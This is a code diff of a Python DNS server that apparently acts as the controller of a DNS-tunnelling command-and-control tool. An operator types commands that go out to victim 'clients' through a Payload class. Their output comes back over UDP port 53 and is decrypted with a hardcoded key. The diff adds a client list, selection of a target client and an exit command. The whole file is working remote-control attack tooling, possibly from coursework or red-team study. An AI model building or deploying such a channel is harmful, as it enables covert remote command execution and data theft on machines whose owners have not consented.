@@ -1,6 +1,5 @@
 from datetime import datetime
 import socket
-import base64
 from dataEncryptor import dataEncryptor
 from payload import Payload
 
@@ -9,21 +8,39 @@ class DNSServer:
     def __init__(self,port,ip):
         self.port = port
         self.ip = ip
-
-    def start(self):
+        self.clients = []
+        self.count = 0
+        self.request = None
+    
+    def start(self, c=None):
         commandRan = False
         commandFinished = True
-        while 1:
+        command = ""
+        while command != "exit":
             if commandFinished:
                 packets = bytearray()
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.bind((self.ip,self.port))
-                print("UDP Server Started Listening")
-                req, address = sock.recvfrom(512) #start listening
-                printWithTime("UDP", f"Received {len(req)} bytes from {address}")
-                command = input("Enter a command:")
-                p = Payload("192.168.7.202")
-                p.payload(sock,req,command)
+                if self.count == 0 and c == None:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.bind((self.ip,self.port))
+                    print("UDP Server Listening...\n")
+                    req, address = sock.recvfrom(512) #start listening
+                    self.request = req
+                    self.count += 1
+                    print("Got a client at " + address[0])
+                    self.clients.append(address[0])
+                print('Type "exit" as a command to quit')
+                command = input("\nEnter a command:")
+                if command == "exit":
+                    sock.close()
+                    self.count = 0
+                    break
+                if c != None:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.bind((self.ip,self.port))
+                    p = Payload(c)
+                else:
+                    p = Payload(address[0])
+                p.payload(sock,self.request,command)
                 commandRan = True
                 newDataList = list()
             if commandRan:
@@ -51,26 +68,22 @@ class DNSServer:
                     d = dataEncryptor()
                     output = d.decrypting(packets,"hellothisismebob")
                     output = output.decode('utf-8')
-                    print(output)
-                    output2 = ""
-                    for i in repr(output):
-                        if i == "'":
-                            continue
-                        elif i == "\\":
-                            break
-                        else:
-                            output2 += i 
-                    print("Output of " + command + ":" + output2)       
+                    print("\nOutput of " + command + ":\n" + output)       
                     commandRan = False
                     commandFinished = True
-                    sock.close()
+
+    def showClients(self):
+        print("\nAvailible Clients:")
+        print("-------------------------------------------------------")
+        for i in range(len(self.clients)):
+            print(str(i + 1) + ". " + self.clients[i])
+        print("\n")
+    
+    def select(self):
+        self.showClients()
+        client = input("Which Client would you like to connect to?")
+        return self.clients[int(client)-1]
 
 def printWithTime(head, message):
         curr_time = datetime.now().strftime("%H:%M:%S.%f")
         print(f"[{head}] [{curr_time[:-3]}]", message)
-
-def main():
-    dns = DNSServer(53,"192.168.7.168")
-    dns.start()
-
-main()
